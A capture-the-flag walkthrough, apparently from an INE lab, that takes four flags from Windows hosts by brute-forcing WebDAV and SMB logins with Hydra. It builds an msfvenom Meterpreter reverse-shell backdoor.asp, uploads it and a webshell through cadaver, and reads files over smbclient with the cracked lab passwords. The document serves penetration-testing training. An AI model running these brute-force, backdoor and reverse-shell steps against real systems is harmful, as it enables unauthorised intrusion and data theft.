
![Screenshot 2025-06-24 121524.png](resources/Screenshot%202025-06-24%20121524.png)

Before checking the first flag, let’s try to understand the target by running an nmap scan. This is to understand what services are running on the target system.

nmap -Pn -sV -sC -p- 10.3.26.83

- sV: `show services`
- \-Pn: `do not ping`
- \-p-: `all ports`
- \-sC: `scan with default script`

When you run the above command, the output will be given as follows.

![d2bcdf4704eb700963c6259fd64fcc11.png](resources/d2bcdf4704eb700963c6259fd64fcc11.png)

As you can see, there are various services running on the target host
**flag 1**: “User ‘bob’ might not have chosen a strong password. Try common passwords. (target1.ine.local)”

So, when we read flag 1, we get the idea that we need to brute force the user “bob” to find the credentials, but what is the service?. Let’s try to access the website running on port 80, as we can see the HTTP service is running on port 80 according to the **nmap results**.

![f84947b3666c04c94047e2b0d68ea897.png](resources/f84947b3666c04c94047e2b0d68ea897.png)

As we can see, the website is running on port 80, and this is a Microsoft IIS httpd 10.0 server running on port 80, which could be potentially vulnerable if the “**WebDAV**” service is not configured correctly.

## **1\. Vulnerable IIS service**

Let’s move to the “WebDAV” directory.

```
http://target1.ine.local/webdav
```

When you try to access the above directory, you will be asked to provide login credentials. So, this could be the service that **flag 1** was talking about. Let’s try to brute force the credentials with the given wordlists. For this purpose, I’m going to use Hydra.

hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.3.26.83 http-get

- \-l: `username`
- \-P: `worldist (password)`

When you run the above command, you will see the password for “bob”.

![002f721fb866ebae057b2cc8f4e26af2.png](resources/002f721fb866ebae057b2cc8f4e26af2.png)

Log in to the “WebDAV ”directory using the above credentials, and then you can find the **flag 1**.

![fcfd58ff3a454959d82c261a6d46616b.png](resources/fcfd58ff3a454959d82c261a6d46616b.png)


![ede9744b61005e5fbe00d6429f6428c5.png](resources/ede9744b61005e5fbe00d6429f6428c5.png)

![d176c4882069ed58d477067c3d30da74.png](resources/d176c4882069ed58d477067c3d30da74.png)

Check other directories.

![80a31af8e87e2d2547913dcd7848e2df.png](resources/80a31af8e87e2d2547913dcd7848e2df.png)

**Let’s move to find flag 2. Let’s check the flag.**

**flag 2: “Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)”**

## 2\. Access the system

To exploit the vulnerability, we need to use 2 tools,

*1.* ***davtest*** *\= used to check what file extensions are accepted by the server  
2.* ***cadaver*** *\= upload the vulnerable file to the target (IIS web server)*

Let’s check which files are accepted by the server using davtest.

davtest -auth bob:password_123321 -url http://10.3.26.83/webdav

![c194c2402d740348fa938bf3e374dd7a.png](resources/c194c2402d740348fa938bf3e374dd7a.png)

As per the results given in davtest, for this purpose, let’s use the “.asp” extension. Now, we need to create a malicious file that allows us to obtain a reverse shell since we can access the “WebDav” directory. Use the following command to create a malicious file using **msfvenom**.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.40.3 LPORT=4444 -f asp > backdoor.asp

- \-p: `payload`
- LHOST: `localhost (ip address of the attack machine)`
- LPORT: `localport (a port on the attack machine)`
- \-f: `file type`

When you run the above command, a file called “backdoor.asp” will be generated with the given parameters. You can check the file by listing the contents of the current directory, whether it is created or not.

![0f2ef8b124e2426877bb5f076dc7db60.png](resources/0f2ef8b124e2426877bb5f076dc7db60.png)

After that, we can upload the generated file using **Cadaver** to the “WebDAV” directory.

cadaver http://target1.ine.local/webdav/

After that, you have to provide the username and the password to access.

put backdoor.asp

We can upload our malicious file using the above command.

![2148e0bc442704d7ba0ff5f4e63151a3.png](resources/2148e0bc442704d7ba0ff5f4e63151a3.png)

After the above process, you can clearly see the backdoor.asp file has been successfully uploaded to the “WebDAV” directory.

![bc07d4eef9682c1ba1c534a14d460488.png](resources/bc07d4eef9682c1ba1c534a14d460488.png)

Now, what we have to do is start a listener from our attack machine. For this purpose, I’m going to use Metasploit.

Use the above commands, respectively.

use multi/handler

set LHOST eth1

set payload windows/meterpreter/reverse_tcp

![2b6cd5a66cce70ff33c151a1d0e59375.png](resources/2b6cd5a66cce70ff33c151a1d0e59375.png)

![b8d7421e5188f91883c6990098720ffb.png](resources/b8d7421e5188f91883c6990098720ffb.png)

So, as you can see, our listener is running on port 4444 from the attack machine’s network interface (localhost).

Now all we have to do is run our backdoor.asp file from the “WebDAV” directory, and then you will get the meterpreter session.

![17701a2dc491467e801ff5468b9540d4.png](resources/17701a2dc491467e801ff5468b9540d4.png)

![11fd07d9d17a7facd1d63fdabd97c5d5.png](resources/11fd07d9d17a7facd1d63fdabd97c5d5.png)

Second Way:

Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)  
    - `davtest -url http://{target1}/webdav/ -auth {username}:{password}`

davtest -url http://10.3.27.91/webdav/ -auth bob:password_123321

![6807da871af7a1ca80b9877f5a12ea77.png](resources/6807da871af7a1ca80b9877f5a12ea77.png)

- Reveals that \`.asp\` files can be executed.  
        - \`cadaver http://{target1}\`  
            - Input username & password.  
        - \`cd /webdav/\`  
        - `put /usr/share/webshells/asp/webshell.asp`
    
- ![ca670c5e805fed3187b367c8bc11f087.png](resources/ca670c5e805fed3187b367c8bc11f087.png)
    
- \- Navigate to \`http://{target1}/webdav\` and select \`webshell.asp\`.
    
- ![ce1f57e7e0426768468836694e901cba.png](resources/ce1f57e7e0426768468836694e901cba.png)
    
- ![7a654683e4e2f1b57890b038239438e1.png](resources/7a654683e4e2f1b57890b038239438e1.png)
    
- \- `dir C:\`
    
- ![77a54f436cd2f34cbdee969ec956a7fc.png](resources/77a54f436cd2f34cbdee969ec956a7fc.png)  
            - Lists the contents of the \`C:\\\` drive.  
            - Reveals \`flag2.txt\`.
    
- ![e1f91c45294f06be2bd4d5c9277b73e8.png](resources/e1f91c45294f06be2bd4d5c9277b73e8.png)  
        - ^^type C:\\flag2.txt^^
    

**flag 3**: “SMB shares might contain hidden files. Check the available shares. (target2.ine.local)”

According to flag 3, let’s check the shares first and then check the hidden files.

## 3\. Enumerate shares in SMB

![ed8447a10afec6306e03e5cd1b66567c.png](resources/ed8447a10afec6306e03e5cd1b66567c.png)

![f5cf37ca740c7593fb79ab72e343b9c9.png](resources/f5cf37ca740c7593fb79ab72e343b9c9.png)

When we try to enumerate SMB shares using msfconsole without any credentials, there is no result.

So, let’s move to brute force SMB service and see what we can find.

hydra -L '/usr/share/metasploit-framework/data/wordlists/common_users.txt' -P '/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt' smb://target2.ine.local

Results are shown below.

![ab364b6ba85e4533d526522d8b5ae43c.png](resources/ab364b6ba85e4533d526522d8b5ae43c.png)

So, as we can see, we can find the administrator’s passwords. Let’s enumerate the shares using **smbclient**.

smbclient -L \\\\\\\\target2.ine.local\\\\ -U administrator

You need to provide the password as “pineapple”. After that, SMB shares will be shown.

![3c71b34fde413806c1742287f4b6097c.png](resources/3c71b34fde413806c1742287f4b6097c.png)

![2948496c940185e236e9bff8f4de484f.png](resources/2948496c940185e236e9bff8f4de484f.png)

Access the C$ share using the following command

smbclient -L \\\\\\\\target2.ine.local\\\\ -U administrator

Provide the password and list the content. You can find the **flag 3** among the other files. Use “***cat flag3.txt***” to obtain the hash.

![cca0407c531fea1a405c8a700c702f1f.png](resources/cca0407c531fea1a405c8a700c702f1f.png)

![3fdd3114d3e72bffac5cb8615f6dd097.png](resources/3fdd3114d3e72bffac5cb8615f6dd097.png)

![14b5907289c6d324dee7f34854a6acb1.png](resources/14b5907289c6d324dee7f34854a6acb1.png)


Don’t close the SMB connection because **flag 4** is also located in the same share but different directory.
flag 4: “The Desktop directory might have what you’re looking for. Enumerate its contents. (target2.ine.local)”

The flag says that **flag 4** is located in a desktop directory.

![b9aad8a5589afcbd9a4fdbe66ac292e7.png](resources/b9aad8a5589afcbd9a4fdbe66ac292e7.png)

![0a141499f9ac6ad658afdc2bf161ce96.png](resources/0a141499f9ac6ad658afdc2bf161ce96.png)

![b727b502e73859747e9f6180f76a26cb.png](resources/b727b502e73859747e9f6180f76a26cb.png)

![03a43614daa2e4a68a3a050bbbfac371.png](resources/03a43614daa2e4a68a3a050bbbfac371.png)

Finally, we found all 4 flags.
